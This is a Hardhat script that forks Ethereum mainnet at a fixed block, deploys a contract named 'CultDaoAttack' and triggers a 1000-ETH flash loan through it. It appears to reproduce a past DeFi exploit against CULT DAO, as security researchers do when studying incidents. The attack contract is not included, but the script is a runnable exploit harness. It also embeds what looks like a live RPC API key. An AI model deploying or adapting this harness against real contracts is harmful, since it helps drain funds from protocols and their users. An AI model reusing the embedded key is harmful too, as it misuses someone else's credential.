// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");
const Web3Utils = require('web3-utils');

async function main() {
  // Hardhat always runs the compile task when running scripts with its command
  // line interface.
  //
  // If this script is run directly using `node` you may want to call compile
  // manually to make sure everything is compiled
  // await hre.run('compile');

  // We get the contract to deploy
  // const Greeter = await hre.ethers.getContractFactory("Greeter");
  // const greeter = await Greeter.deploy("Hello, Hardhat!");

  // await greeter.deployed();

  // console.log("Greeter deployed to:", greeter.address);

  await network.provider.request({
    method: "hardhat_reset",
    params: [{
      forking: {
        jsonRpcUrl: "https://eth-mainnet.nodereal.io/v1/3bcd5b1da993472380b454254c6202b8",
        blockNumber: 14915574
      }
    }]
  })
  
  
  const [attacker] = await ethers.getSigners();

  const Exploit = await hre.ethers.getContractFactory("CultDaoAttack");
  const exploit = await Exploit.deploy();

  await exploit.deployed();

  console.log("exploit deployed to:", exploit.address);

  await exploit.initiateFlashLoan("0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e","0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
  Web3Utils.toWei('1000', 'ether'));


  // const [attacker] = await ethers.getSigners();

  // const Exploit = await hre.ethers.getContractFactory("Exploit");
  // const exploit = await Exploit.deploy();

  // await exploit.deployed();

  // console.log("exploit deployed to:", exploit.address);

  // await exploit.exp();
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
